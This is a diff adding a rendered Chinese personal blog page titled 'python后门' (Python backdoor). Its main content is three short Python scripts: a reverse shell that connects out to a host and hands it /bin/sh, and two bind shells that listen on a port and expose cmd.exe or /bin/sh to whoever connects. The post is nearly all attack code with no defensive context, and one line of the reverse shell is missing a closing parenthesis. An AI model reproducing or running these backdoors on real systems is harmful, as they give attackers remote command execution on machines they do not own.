@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        python后门 - Daybreak&#39;s Blog
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> sometimes code, sometimes hack. </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar">
+            <img src="/img/Daybreak.png" />
+        </div>
+        <div class="name">
+            <i>Daybreak</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>主页</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>标签</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>存档</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>关于</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>搜索</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#python反向链接后门"><span class="toc-text">python反向链接后门</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#python正向链接后门"><span class="toc-text">python正向链接后门</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#windows正向链接CmdShell"><span class="toc-text">windows正向链接CmdShell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux版-bin-sh"><span class="toc-text">linux版/bin/sh</span></a></li></ol></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">搜索</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+        <div class="index-about-mobile">
+            <i> sometimes code, sometimes hack. </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        python后门
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">发布于：<span>2018-09-20 09:45:02</span></span>
+        
+        <span class="attr">标签：/
+        
+        <a class="tag" href="/tags/#python" title="python">python</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <h1 id="python反向链接后门"><a href="#python反向链接后门" class="headerlink" title="python反向链接后门"></a>python反向链接后门</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import socket, subprocess, os</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM</span><br><span class="line">s.connect((host,port))</span><br><span class="line">os.dup2(s.fileno(),0) # 0代表系统的stdin</span><br><span class="line">os.dup2(s.fileno(),1) # 1代表系统的stdout</span><br><span class="line">os.dup2(s.fileno(),2) # 2代表系统的stderr</span><br><span class="line">p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])</span><br></pre></td></tr></table></figure>
+<h1 id="python正向链接后门"><a href="#python正向链接后门" class="headerlink" title="python正向链接后门"></a>python正向链接后门</h1><h2 id="windows正向链接CmdShell"><a href="#windows正向链接CmdShell" class="headerlink" title="windows正向链接CmdShell"></a>windows正向链接CmdShell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from socket import *</span><br><span class="line">import subprocess</span><br><span class="line">import os, threading</span><br><span class="line"></span><br><span class="line">def send(talk, proc):</span><br><span class="line">        import time</span><br><span class="line">        while True:</span><br><span class="line">                msg = proc.stdout.readline()</span><br><span class="line">                talk.send(msg)</span><br><span class="line">                </span><br><span class="line">server=socket(AF_INET,SOCK_STREAM)</span><br><span class="line">server.bind((&apos;0.0.0.0&apos;,port))</span><br><span class="line">server.listen(5)</span><br><span class="line">talk, addr = server.accept()</span><br><span class="line">print(&quot;connecting &quot;, addr)</span><br><span class="line">proc = subprocess.Popen(&apos;cmd.exe /K&apos;, stdin=subprocess.PIPE,</span><br><span class="line">                stdout=subprocess.PIPE, stderr=subprocess.PIPE,</span><br><span class="line">                shell=True)</span><br><span class="line">t = threading.Thread(target = send, args = (talk, proc))</span><br><span class="line">t.setDaemon(True)</span><br><span class="line">t.start()</span><br><span class="line">while True:</span><br><span class="line">    cmd=talk.recv(1024)</span><br><span class="line">    proc.stdin.write(cmd)</span><br><span class="line">    proc.stdin.flush()</span><br><span class="line">server.close()</span><br></pre></td></tr></table></figure>
+<h2 id="linux版-bin-sh"><a href="#linux版-bin-sh" class="headerlink" title="linux版/bin/sh"></a>linux版/bin/sh</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from socket import *</span><br><span class="line">import subprocess</span><br><span class="line">import os, threading, sys</span><br><span class="line"></span><br><span class="line">server=socket(AF_INET,SOCK_STREAM)</span><br><span class="line">server.bind((&apos;0.0.0.0&apos;,port))</span><br><span class="line">server.listen(5)</span><br><span class="line">talk, addr = server.accept()</span><br><span class="line">print(&quot;connecting &quot;, addr)</span><br><span class="line">proc = subprocess.Popen([&quot;/bin/sh&quot;,&quot;-i&quot;], stdin=talk,</span><br><span class="line">                        stdout=talk, stderr=talk, shell=True)</span><br></pre></td></tr></table></figure>
+
+        
+        <div id="comment-container">
+        </div>
+    </div>
+</div>
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span>/</span>
+        
+        <span><a href="http://pupiles.com">pupil</a></span>
+        <span>/</span>
+        
+        <span><a href="https://www.cnblogs.com/test404">胖虎</a></span>
+        <span>/</span>
+        
+    </p>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+</html>
